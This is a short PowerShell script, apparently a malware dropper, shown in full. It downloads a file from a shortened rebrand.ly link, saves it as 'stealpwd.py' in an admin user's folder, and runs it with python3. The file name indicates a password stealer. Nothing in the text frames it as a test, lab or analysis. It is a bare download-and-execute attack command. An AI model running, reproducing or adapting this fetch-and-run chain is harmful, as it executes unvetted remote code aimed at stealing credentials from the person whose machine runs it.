$WebClient = New-Object System.Net.WebClient
$WebClient.DownloadFile("https://rebrand.ly/iab05iw", "C:\Users\admin\stealpwd.py")
python3 "C:\Users\admin\stealpwd.py"
